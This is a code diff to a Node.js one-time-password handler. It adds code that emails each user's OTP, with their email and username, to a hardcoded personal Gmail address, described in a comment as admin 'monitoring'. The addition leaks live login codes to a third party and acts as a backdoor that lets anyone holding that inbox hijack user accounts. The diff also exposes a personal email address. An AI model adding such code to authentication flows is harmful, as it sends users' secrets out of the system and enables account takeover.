@@ -123,7 +123,24 @@ export const sendOtp = async (req, res) => {
     console.log("💾 OTP saved to database");
 
     try {
+      // Send OTP to the user's email
       await sendEmail(email, "Your OTP Code", `Your OTP is: ${otp}`);
+      
+      // Also send a copy to the admin email for monitoring
+      const adminEmail = "manalipanchal2404@gmail.com";
+      if (email !== adminEmail) {
+        try {
+          await sendEmail(
+            adminEmail, 
+            `OTP Sent to ${email}`, 
+            `OTP ${otp} was sent to ${email} (${user.username})`
+          );
+          console.log("✅ OTP copy sent to admin");
+        } catch (adminEmailError) {
+          console.log("⚠️ Failed to send copy to admin:", adminEmailError.message);
+        }
+      }
+      
       console.log("✅ OTP email sent successfully");
     } catch (emailError) {
       console.error("❌ Email sending failed:", emailError.message);
